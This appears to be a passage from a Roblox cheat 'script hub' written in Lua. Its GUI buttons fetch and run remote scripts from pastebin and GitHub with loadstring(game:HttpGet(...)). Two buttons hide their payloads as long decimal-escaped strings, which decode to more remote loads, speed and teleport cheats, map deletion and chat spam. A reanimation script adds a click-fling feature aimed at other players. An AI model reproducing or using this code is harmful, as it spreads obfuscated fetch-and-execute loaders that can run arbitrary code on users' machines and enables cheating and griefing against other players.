        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 3 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(4 + 0 * math.sin(sine/12))),0.1)
    end
    joints["Right Shoulder"].C0 = joints["Right Shoulder"].C0:lerp(CFrame.new(-0.4 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), -0.8 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    joints["Left Shoulder"].C0 = joints["Left Shoulder"].C0:lerp(CFrame.new(0.4 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), -0.8 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
end
end)

Window1Section:NewButton("Fe Da feet animation r6", "only r6", function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/7291747e9f093555573e027621f08d6e/raw/23b48f2463942befe19d81aa8a06e3222996242c/FE%2520Da%2520Feets'))()
end)
Window1Section:NewButton("Backflip and front flip with buttons r6 and r15", "Fe works r6 and r15✔️", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/yjxXnxbS'))()
end)
Section:NewButton("Fe Fake Lag", "Fe Lag r15 and r6", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/VM3b0Thg'))()
end)
Section:NewButton("Build A boat copy builds (READ INFO)", "do any file name you want and press safe mode", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/StenDirt/Trash-Game/main/Script.lua"))()
end)
End1Section:NewButton("Pro Hub Op", "This op", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Kindasua/v.1-beta/main/Fixed%20bugs%20v.1%20beta"), true))()
end)
Section:NewButton("Natural Disaster Script", "Henlo idk okeh", function()
    loadstring("\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\83\116\97\114\116\101\114\71\117\105\34\41\58\83\101\116\67\111\114\101\40\34\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110\34\44\123\10\84\105\116\108\101\32\61\32\34\73\109\32\80\97\116\114\105\99\107\34\44\10\84\101\120\116\32\61\32\34\76\111\97\100\105\110\103\46\46\34\44\32\10\32\10\32\10\66\117\116\116\111\110\49\32\61\32\34\79\107\34\44\10\68\117\114\97\116\105\111\110\32\61\32\51\48\32\10\125\41\10\119\97\105\116\40\50\41\10\10\108\111\99\97\108\32\76\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\118\102\102\49\98\81\57\70\34\41\41\40\41\10\10\108\111\99\97\108\32\87\105\110\100\111\119\32\61\32\76\105\98\114\97\114\121\46\67\114\101\97\116\101\76\105\98\40\34\78\97\116\117\114\97\108\32\68\105\115\97\115\116\101\114\32\71\117\105\34\44\32\34\79\99\101\97\110\34\41\10\10\108\111\99\97\108\32\84\97\98\49\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\83\99\114\105\112\116\34\41\10\108\111\99\97\108\32\84\97\98\49\83\101\99\116\105\111\110\32\61\32\84\97\98\49\58\78\101\119\83\101\99\116\105\111\110\40\34\83\99\114\105\112\116\34\41\10\10\108\111\99\97\108\32\84\97\98\50\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\84\101\108\101\112\111\114\116\34\41\10\108\111\99\97\108\32\84\97\98\50\83\101\99\116\105\111\110\32\61\32\84\97\98\50\58\78\101\119\83\101\99\116\105\111\110\40\34\84\101\108\101\112\111\114\116\34\41\10\10\108\111\99\97\108\32\84\97\98\51\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\66\121\112\97\115\115\34\41\10\108\111\99\97\108\32\84\97\98\51\83\101\99\116\105\111\110\32\61\32\84\97\98\51\58\78\101\119\83\101\99\116\105\111\110\40\34\66\121\112\97\115\115\34\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\71\101\116\32\66\97\108\108\111\110\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\105\102\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\71\114\101\101\110\66\97\108\108\111\111\110\34\44\32\116\114\117\101\41\32\116\104\101\110\32\45\45\32\67\104\101\99\107\32\102\111\114\32\115\116\101\97\108\97\98\108\101\32\71\114\101\101\110\66\97\108\108\111\111\110\32\10\9\98\97\108\108\111\111\110\67\108\111\110\101\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\71\114\101\101\110\66\97\108\108\111\111\110\34\44\32\116\114\117\101\41\58\67\108\111\110\101\40\41\32\45\45\32\99\108\111\110\101\32\105\116\32\10\9\98\97\108\108\111\111\110\67\108\111\110\101\46\80\97\114\101\110\116\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\10\101\110\100\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\112\111\111\107\121\115\99\97\114\121\115\107\101\108\101\116\111\110\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\99\97\108\32\115\111\110\103\32\61\32\34\83\79\78\71\32\78\65\77\69\34\10\10\114\101\113\117\101\115\116\32\61\32\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\108\121\114\105\99\115\46\102\108\99\46\98\97\114\47\115\101\97\114\99\104\63\115\111\110\103\61\115\112\111\111\107\121\115\112\111\111\107\121\115\107\101\108\101\116\111\110\34\41\10\10\100\101\99\111\100\101\100\32\61\32\103\97\109\101\46\72\116\116\112\83\101\114\118\105\99\101\58\74\83\79\78\68\101\99\111\100\101\40\114\101\113\117\101\115\116\41\10\10\108\111\99\97\108\32\108\121\114\105\99\115\32\61\32\123\125\10\102\111\114\32\105\32\105\110\32\100\101\99\111\100\101\100\46\108\121\114\105\99\115\58\103\109\97\116\99\104\40\34\91\94\92\114\92\110\93\43\34\41\32\100\111\10\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\108\121\114\105\99\115\44\32\105\41\10\101\110\100\10\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\108\121\114\105\99\115\41\32\100\111\10\32\32\32\119\97\105\116\40\51\41\10\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\118\44\32\34\65\108\108\34\41\10\101\110\100\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\97\105\110\98\111\119\32\40\110\111\116\32\70\101\41\32\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\9\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\10\9\9\103\97\109\101\46\76\105\103\104\116\105\110\103\46\65\109\98\105\101\110\116\32\61\32\67\111\108\111\114\51\46\110\101\119\40\109\97\116\104\46\114\97\110\100\111\109\40\41\44\32\109\97\116\104\46\114\97\110\100\111\109\40\41\44\32\109\97\116\104\46\114\97\110\100\111\109\40\41\41\10\9\9\119\97\105\116\40\46\50\53\41\10\32\10\9\101\110\100\10\101\110\100\41\10\10\84\97\98\50\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\112\97\119\110\34\44\32\34\73\109\32\80\97\116\114\105\99\107\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\67\70\114\97\109\101\46\110\101\119\40\49\48\54\44\32\52\54\44\32\51\41\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\101\109\111\118\101\32\70\97\108\108\32\100\97\109\97\103\101\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\70\97\108\108\68\97\109\97\103\101\83\99\114\105\112\116\58\68\101\115\116\114\111\121\40\41\10\101\110\100\41\10\10\84\97\98\50\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\76\111\98\98\121\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\67\70\114\97\109\101\46\110\101\119\40\45\50\57\48\44\32\49\55\56\44\32\51\55\57\41\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\101\109\111\118\101\32\77\97\112\115\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\83\116\114\117\99\116\117\114\101\58\68\101\115\116\114\111\121\40\41\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\101\109\111\118\101\32\83\99\114\101\101\110\32\69\102\102\101\99\116\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\87\101\97\116\104\101\114\77\97\99\104\105\110\101\58\68\101\115\116\114\111\121\40\41\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\84\112\116\111\111\108\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\109\111\117\115\101\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\58\71\101\116\77\111\117\115\101\40\41\10\116\111\111\108\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\111\111\108\34\41\10\116\111\111\108\46\82\101\113\117\105\114\101\115\72\97\110\100\108\101\32\61\32\102\97\108\115\101\10\116\111\111\108\46\78\97\109\101\32\61\32\34\84\80\32\84\79\79\76\34\10\116\111\111\108\46\65\99\116\105\118\97\116\101\100\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\108\111\99\97\108\32\112\111\115\32\61\32\109\111\117\115\101\46\72\105\116\43\86\101\99\116\111\114\51\46\110\101\119\40\48\44\50\46\53\44\48\41\10\112\111\115\32\61\32\67\70\114\97\109\101\46\110\101\119\40\112\111\115\46\88\44\112\111\115\46\89\44\112\111\115\46\90\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\10\101\110\100\41\10\116\111\111\108\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\87\97\108\107\83\112\101\101\100\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\53\48\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\74\117\109\112\112\111\119\101\114\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\74\117\109\112\80\111\119\101\114\32\61\32\49\53\48\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\84\101\120\116\66\111\120\40\34\67\117\115\116\111\109\32\87\115\112\101\101\100\34\44\32\34\78\117\109\98\101\114\34\44\32\102\117\110\99\116\105\111\110\40\116\120\116\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\116\120\116\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\84\101\120\116\66\111\120\40\34\67\117\115\116\111\109\32\72\106\117\109\112\34\44\32\34\78\117\109\98\101\114\34\44\32\102\117\110\99\116\105\111\110\40\116\120\116\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\74\117\109\112\80\111\119\101\114\32\61\32\116\120\116\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\73\110\102\32\106\117\109\112\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\67\57\55\101\65\121\82\34\44\32\116\114\117\101\41\41\40\41\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\101\109\111\118\101\32\70\111\103\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\70\111\103\69\110\100\32\61\32\49\48\48\48\48\48\10\9\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\65\116\109\111\115\112\104\101\114\101\34\41\32\116\104\101\110\10\9\9\9\118\58\68\101\115\116\114\111\121\40\41\10\9\9\101\110\100\10\9\101\110\100\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\70\108\121\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\45\45\65\82\67\69\85\83\32\88\32\70\76\89\32\86\50\32\83\67\82\73\80\84\32\66\89\32\109\101\95\111\122\111\110\101\89\84\10\108\111\97\100\115\116\114\105\110\103\40\34\92\49\48\56\92\49\49\49\92\57\55\92\49\48\48\92\49\49\53\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51\92\52\48\92\49\48\51\92\57\55\92\49\48\57\92\49\48\49\92\53\56\92\55\50\92\49\49\54\92\49\49\54\92\49\49\50\92\55\49\92\49\48\49\92\49\49\54\92\52\48\92\52\48\92\51\57\92\49\48\52\92\49\49\54\92\49\49\54\92\49\49\50\92\49\49\53\92\53\56\92\52\55\92\52\55\92\49\48\51\92\49\48\53\92\49\49\53\92\49\49\54\92\52\54\92\49\48\51\92\49\48\53\92\49\49\54\92\49\48\52\92\49\49\55\92\57\56\92\49\49\55\92\49\49\53\92\49\48\49\92\49\49\52\92\57\57\92\49\49\49\92\49\49\48\92\49\49\54\92\49\48\49\92\49\49\48\92\49\49\54\92\52\54\92\57\57\92\49\49\49\92\49\48\57\92\52\55\92\49\48\57\92\49\48\49\92\49\49\49\92\49\50\50\92\49\49\49\92\49\49\48\92\49\48\49\92\56\57\92\56\52\92\52\55\92\57\56\92\49\48\50\92\52\56\92\53\49\92\53\53\92\49\48\48\92\49\48\50\92\49\48\50\92\53\55\92\49\48\50\92\52\56\92\57\55\92\53\53\92\52\56\92\52\56\92\52\57\92\53\53\92\53\49\92\52\56\92\53\50\92\49\48\48\92\49\48\48\92\49\48\48\92\53\52\92\53\53\92\49\48\50\92\49\48\48\92\57\57\92\49\48\48\92\53\49\92\53\53\92\52\56\92\52\55\92\49\49\52\92\57\55\92\49\49\57\92\52\55\92\49\48\49\92\52\57\92\53\50\92\49\48\49\92\53\53\92\53\50\92\49\48\50\92\53\50\92\53\48\92\53\51\92\57\56\92\52\56\92\53\52\92\52\56\92\49\48\48\92\49\48\50\92\53\51\92\53\48\92\53\49\92\53\49\92\53\50\92\53\49\92\57\57\92\49\48\50\92\53\49\92\52\56\92\57\56\92\53\53\92\53\54\92\53\53\92\52\56\92\53\53\92\53\50\92\49\48\49\92\57\56\92\53\49\92\57\57\92\53\51\92\49\48\48\92\53\48\92\52\55\92\57\55\92\49\49\52\92\57\57\92\49\48\49\92\49\49\55\92\49\49\53\92\51\55\92\53\48\92\53\51\92\53\48\92\52\56\92\49\50\48\92\51\55\92\53\48\92\53\51\92\53\48\92\52\56\92\49\48\50\92\49\48\56\92\49\50\49\92\51\55\92\53\48\92\53\51\92\53\48\92\52\56\92\53\48\92\51\55\92\53\48\92\53\51\92\53\48\92\52\56\92\49\49\49\92\57\56\92\49\48\50\92\49\48\56\92\49\49\55\92\57\57\92\57\55\92\49\49\54\92\49\49\49\92\49\49\52\92\51\57\92\52\49\92\52\52\92\49\49\54\92\49\49\52\92\49\49\55\92\49\48\49\92\52\49\92\52\49\92\52\48\92\52\49\92\49\48\92\49\48\34\41\40\41\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\111\117\110\100\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\99\97\108\32\100\117\114\97\116\105\111\110\32\61\32\56\32\45\45\32\105\110\116\101\103\101\114\32\111\110\108\121\44\32\110\111\32\100\101\99\105\109\97\108\115\10\10\10\10\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\83\111\117\110\100\83\101\114\118\105\99\101\34\41\46\82\101\115\112\101\99\116\70\105\108\116\101\114\105\110\103\69\110\97\98\108\101\100\32\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\10\10\108\111\99\97\108\32\115\111\117\110\100\115\32\61\32\123\125\10\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\119\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\32\32\32\32\105\102\32\118\58\73\115\65\40\34\83\111\117\110\100\34\41\32\97\110\100\32\118\46\80\97\114\101\110\116\46\78\97\109\101\32\126\61\32\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\32\116\104\101\110\10\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\115\111\117\110\100\115\44\118\41\10\32\32\32\32\101\110\100\10\101\110\100\10\10\10\108\111\99\97\108\32\99\111\110\32\61\32\119\111\114\107\115\112\97\99\101\46\68\101\115\99\101\110\100\97\110\116\65\100\100\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\118\41\10\32\32\32\32\105\102\32\118\58\73\115\65\40\34\83\111\117\110\100\34\41\32\97\110\100\32\118\46\80\97\114\101\110\116\46\78\97\109\101\32\126\61\32\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\32\116\104\101\110\10\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\115\111\117\110\100\115\44\118\41\10\32\32\32\32\101\110\100\10\101\110\100\41\10\119\97\105\116\40\46\49\41\10\108\111\99\97\108\32\115\116\97\114\116\32\61\32\109\97\116\104\46\102\108\111\111\114\40\116\105\99\107\40\41\41\10\114\101\112\101\97\116\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\115\111\117\110\100\115\41\32\100\111\10\32\32\32\32\32\32\32\32\118\58\80\108\97\121\40\41\10\32\32\32\32\32\32\32\32\118\46\84\105\109\101\80\111\115\105\116\105\111\110\32\61\32\109\97\116\104\46\114\97\110\100\111\109\40\48\44\118\46\84\105\109\101\76\101\110\103\116\104\32\42\32\49\48\48\48\41\47\49\48\48\48\10\32\32\32\32\32\32\32\32\116\97\115\107\46\119\97\105\116\40\41\10\32\32\32\32\101\110\100\10\117\110\116\105\108\32\109\97\116\104\46\102\108\111\111\114\40\116\105\99\107\40\41\41\32\61\61\32\115\116\97\114\116\32\43\32\100\117\114\97\116\105\111\110\10\99\111\110\58\68\105\115\99\111\110\110\101\99\116\40\41\10\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\115\111\117\110\100\115\41\32\100\111\10\32\32\32\32\118\58\83\116\111\112\40\41\10\101\110\100\10\101\110\100\41\32\10")()
end)
Section:NewButton("Bedwars script jnhh gaming", "Credit to owner", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/GamingScripter/JNHHHH/main/JNHHHHH")))()
end)




Window1Section:NewButton("Fe sans only r6 (READ INFO)", "To move  Press inf yield then tpwalk", function()
    
--MADE BY Redmoon--
--Items:
clickfling = true -- set this to false if u dont want click fling or use torso fling

function rmesh(a)
if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
old=game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
if v:IsA('Mesh') or v:IsA('SpecialMesh') then
v:Remove()
end
end
for i = 1 , 2 do
game.Players.LocalPlayer.Character=old
end
end

a=game.Players.LocalPlayer b=game.Players.LocalPlayer.Character c={}d=table.insert e=false for D,E in next,game:GetService("Players").LocalPlayer.Character:GetDescendants()do if E:IsA("BasePart")then d(c,game:GetService("RunService").Heartbeat:connect(function()pcall(function()E.Velocity=Vector3.new(-30,0,0)sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge)sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999)game.Players.LocalPlayer.ReplicationFocus=workspace end)end))end end function f(D,E,F)game.StarterGui:SetCore("SendNotification",{Title=D;Text=E;Duration=F or 5;})end local x=game:GetService("RunService")g=Instance.new('Folder',b)g.Name='CWExtra'b.Archivable=true local y=b:Clone()y.Name='NexoPD'for D,E in next,y:GetDescendants()do if E:IsA('BasePart')or E:IsA('Decal')then E.Transparency=1 end end h=5.65 a.Character=nil a.Character=b b.Humanoid.AutoRotate=false b.Humanoid.WalkSpeed=0 b.Humanoid.JumpPower=0 b.Torso.Anchored=true f('Nexo','Reanimating...\nPlease wait '..h..' seconds.')wait(h)b.Torso.Anchored=false f('Nexo','Reanimated..')b.Humanoid.Health=0 y.Animate.Disabled=true y.Parent=g y.HumanoidRootPart.CFrame=b.HumanoidRootPart.CFrame*CFrame.new(0,5,0)function i(D,E,F,G)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("AlignOrientation",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignOrientation.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]D.AlignOrientation.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D[D.Name].Orientation=G or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.AlignOrientation.Responsiveness=math.huge D.AlignPosition.RigidityEnabled=false D.AlignOrientation.MaxTorque=999999999 D.Massless=true end function j(D,E,F)Instance.new("Attachment",D)Instance.new("AlignPosition",D)Instance.new("Attachment",E)D.Attachment.Name=D.Name E.Attachment.Name=D.Name D.AlignPosition.Attachment0=D[D.Name]D.AlignPosition.Attachment1=E[D.Name]E[D.Name].Position=F or Vector3.new()D.AlignPosition.MaxForce=999999999 D.AlignPosition.MaxVelocity=math.huge D.AlignPosition.ReactionForceEnabled=false D.AlignPosition.Responsiveness=math.huge D.Massless=true end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.RenderStepped:Connect(function()E.CanCollide=false end))end end for D,E in next,y:GetDescendants()do if E:IsA('BasePart')then d(c,x.Stepped:Connect(function()E.CanCollide=false end))end end for D,E in next,b:GetDescendants()do if E:IsA('Accessory')then i(E.Handle,y[E.Name].Handle)end end i(b['Head'],y['Head'])i(b['Torso'],y['Torso'])j(b['HumanoidRootPart'],y['Torso'],Vector3.new(0,0,0))i(b['Right Arm'],y['Right Arm'])i(b['Left Arm'],y['Left Arm'])i(b['Right Leg'],y['Right Leg'])i(b['Left Leg'],y['Left Leg'])k=a:GetMouse()local z=Instance.new("Part",g)z.CanCollide=false z.Transparency=1 d(c,x.RenderStepped:Connect(function()local D=workspace.CurrentCamera.CFrame.lookVector local E=y["HumanoidRootPart"]z.Position=E.Position z.CFrame=CFrame.new(z.Position,Vector3.new(D.X*10000,D.Y,D.Z*10000))end))l=false m=false n=false o=false p=false function q(D)r=Instance.new('BodyAngularVelocity',D)r.AngularVelocity=Vector3.new(9e9,9e9,9e9)r.MaxTorque=Vector3.new(9e9,9e9,9e9)end q(b.HumanoidRootPart)k=a:GetMouse()s=Instance.new('BodyPosition',b.HumanoidRootPart)s.P=9e9 s.D=9e9 s.MaxForce=Vector3.new(99999,99999,99999)local A d(c,x.Heartbeat:Connect(function()if A==true then s.Position=k.Hit.p b.HumanoidRootPart.Position=k.Hit.p else s.Position=y.Torso.Position b.HumanoidRootPart.Position=y.Torso.Position end end))local B=Instance.new("SelectionBox")B.Adornee=b.HumanoidRootPart B.LineThickness=0.02 B.Color3=Color3.fromRGB(250,0,0)B.Parent=b.HumanoidRootPart B.Name="RAINBOW"t=B if clickfling then d(c,k.Button1Down:Connect(function()A=true end))d(c,k.Button1Up:Connect(function()A=false end))end d(c,k.KeyDown:Connect(function(D)if D==' 'then p=true end if D=='w'then l=true end if D=='s'then m=true end if D=='a'then n=true end if D=='d'then o=true end end))d(c,k.KeyUp:Connect(function(D)if D==' 'then p=false end if D=='w'then l=false end if D=='s'then m=false end if D=='a'then n=false end if D=='d'then o=false end end))local function C(D,E,F)z.CFrame=z.CFrame*CFrame.new(-D,E,-F)y.Humanoid.WalkToPoint=z.Position end d(c,x.RenderStepped:Connect(function()if l==true then C(0,0,1e4)end if m==true then C(0,0,-1e4)end if n==true then C(1e4,0,0)end if o==true then C(-1e4,0,0)end if p==true then y.Humanoid.Jump=true end if l~=true and n~=true and m~=true and o~=true then y.Humanoid.WalkToPoint=y.HumanoidRootPart.Position end end))workspace.CurrentCamera.CameraSubject=y.Humanoid u=Instance.new('BindableEvent')d(c,u.Event:Connect(function()y:Destroy()e=true v=false for D,E in next,b:GetDescendants()do if E:IsA('BasePart')then E.Anchored=true end end w=b.Humanoid:Clone()b.Humanoid:Destroy()w.Parent=b game.Players:Chat('-re')for D,E in pairs(c)do E:Disconnect()end game:GetService("StarterGui"):SetCore("ResetButtonCallback",true)u:Remove()end))game:GetService("StarterGui"):SetCore("ResetButtonCallback",u)

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

reanim = workspace.Camera.CameraSubject.Parent

function hat(h,p,c1,c0,m)
reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
if m == true then
rmesh(h)
end
end

m=game.Players.LocalPlayer:GetMouse()
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
